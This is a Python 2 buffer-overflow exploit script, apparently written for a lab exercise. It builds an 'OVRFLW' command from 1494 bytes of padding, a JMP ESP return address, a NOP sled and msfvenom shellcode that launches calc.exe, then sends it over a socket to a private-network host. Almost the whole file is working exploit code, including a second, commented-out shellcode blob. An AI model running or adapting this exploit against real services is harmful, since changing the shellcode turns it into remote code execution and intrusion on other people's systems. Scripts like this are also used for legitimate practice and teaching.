#!/usr/bin/python

import socket
import struct

ptr_jmp_esp = 0x56526683
#badchars = [0x00, 0x0A]			#every time bad...
#badchars += [0x04, 0x38]

tolen_buf = 3000
offset_rsp = 1494
#ptr_jmp_esp = "\x83\x66\x52\x56" #JMP ESP adress in littleendian format
nops = "\x90"*20
#shellcode = "\xbe\x32\x12\xe1\xfa\xda\xdd\xd9\x74\x24\xf4\x58\x29\xc9\xb1\x31\x31\x70\x13\x83\xc0\x04\x03\x70\x3d\xf0\x14\x06\xa9\x76\xd6\xf7\x29\x17\x5e\x12\x18\x17\x04\x56\x0a\xa7\x4e\x3a\xa6\x4c\x02\xaf\x3d\x20\x8b\xc0\xf6\x8f\xed\xef\x07\xa3\xce\x6e\x8b\xbe\x02\x51\xb2\x70\x57\x90\xf3\x6d\x9a\xc0\xac\xfa\x09\xf5\xd9\xb7\x91\x7e\x91\x56\x92\x63\x61\x58\xb3\x35\xfa\x03\x13\xb7\x2f\x38\x1a\xaf\x2c\x05\xd4\x44\x86\xf1\xe7\x8c\xd7\xfa\x44\xf1\xd8\x08\x94\x35\xde\xf2\xe3\x4f\x1d\x8e\xf3\x8b\x5c\x54\x71\x08\xc6\x1f\x21\xf4\xf7\xcc\xb4\x7f\xfb\xb9\xb3\xd8\x1f\x3f\x17\x53\x1b\xb4\x96\xb4\xaa\x8e\xbc\x10\xf7\x55\xdc\x01\x5d\x3b\xe1\x52\x3e\xe4\x47\x18\xd2\xf1\xf5\x43\xb8\x04\x8b\xf9\x8e\x07\x93\x01\xbe\x6f\xa2\x8a\x51\xf7\x3b\x59\x16\x07\x76\xc0\x3e\x80\xdf\x90\x03\xcd\xdf\x4e\x47\xe8\x63\x7b\x37\x0f\x7b\x0e\x32\x4b\x3b\xe2\x4e\xc4\xae\x04\xfd\xe5\xfa\x66\x60\x76\x66\x47\x07\xfe\x0d\x97\xb8\x4b\x37\xcc\x5d\xdb\xde\xd9\x74\x24\xf4\x5e\x31\xc9\xb1\x12\x31\x46\x12\x83\xc6\x04\x03\x0d\x39\x2e\xa8\xa0\x9e\x59\xb0\x91\x63\xf5\x5d\x17\xed\x18\x11\x71\x20\x5a\xc1\x24\x0a\x64\x2b\x56\x23\xe2\x4a\x3e\x74\xbc\x1e\x3e\x1c\xbf\x60\x3f\x66\x36\x81\x8f\xfe\x19\x13\xbc\x4d\x9a\x1a\xa3\x7f\x1d\x4e\x4b\xee\x31\x1c\xe3\x86\x62\xcd\x91\x3f\xf4\xf2\x07\x93\x8f\x14\x17\x18\x5d\x56"
shellcode =  ""
shellcode += "\xbb\x7c\x47\x8c\x3e\xd9\xe9\xd9\x74\x24\xf4"
shellcode += "\x5a\x29\xc9\xb1\x31\x31\x5a\x13\x03\x5a\x13"
shellcode += "\x83\xea\x80\xa5\x79\xc2\x90\xa8\x82\x3b\x60"
shellcode += "\xcd\x0b\xde\x51\xcd\x68\xaa\xc1\xfd\xfb\xfe"
shellcode += "\xed\x76\xa9\xea\x66\xfa\x66\x1c\xcf\xb1\x50"
shellcode += "\x13\xd0\xea\xa1\x32\x52\xf1\xf5\x94\x6b\x3a"
shellcode += "\x08\xd4\xac\x27\xe1\x84\x65\x23\x54\x39\x02"
shellcode += "\x79\x65\xb2\x58\x6f\xed\x27\x28\x8e\xdc\xf9"
shellcode += "\x23\xc9\xfe\xf8\xe0\x61\xb7\xe2\xe5\x4c\x01"
shellcode += "\x98\xdd\x3b\x90\x48\x2c\xc3\x3f\xb5\x81\x36"
shellcode += "\x41\xf1\x25\xa9\x34\x0b\x56\x54\x4f\xc8\x25"
shellcode += "\x82\xda\xcb\x8d\x41\x7c\x30\x2c\x85\x1b\xb3"
shellcode += "\x22\x62\x6f\x9b\x26\x75\xbc\x97\x52\xfe\x43"
shellcode += "\x78\xd3\x44\x60\x5c\xb8\x1f\x09\xc5\x64\xf1"
shellcode += "\x36\x15\xc7\xae\x92\x5d\xe5\xbb\xae\x3f\x63"
shellcode += "\x3d\x3c\x3a\xc1\x3d\x3e\x45\x75\x56\x0f\xce"
shellcode += "\x1a\x21\x90\x05\x5f\xcd\x72\x8c\x95\x66\x2b"
shellcode += "\x45\x14\xeb\xcc\xb3\x5a\x12\x4f\x36\x22\xe1"
shellcode += "\x4f\x33\x27\xad\xd7\xaf\x55\xbe\xbd\xcf\xca"
shellcode += "\xbf\x97\xb3\x8d\x53\x7b\x1a\x28\xd4\x1e\x62"

#shellcode = windows calc
#generated with msfvenom -p windows/exec -b '\x00\x0A\x04\x38' -f python --var-name shellcode CMD=calc.exe EXITFUNC=thread
#payload = "OVRFLW" + "A"* offset_rsp + ptr_jmp_esp + nops + shellcode + "D" * (tolen_buf - len(shellcode)) + "\r\n"
payload = "OVRFLW"
payload += "A" * offset_rsp
#payload += ptr_jmp_esp
payload += struct.pack("<I", ptr_jmp_esp)
payload += '\x90'*20
payload += shellcode
payload += "D" * (tolen_buf - len(payload))
payload += "\r\n"
#payload = "A"*524 + esp + nops + shellcode

RHOST = "192.168.1.59"
RPORT = 4455

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

print s.recv(1024)
s.send(payload)
s.close()

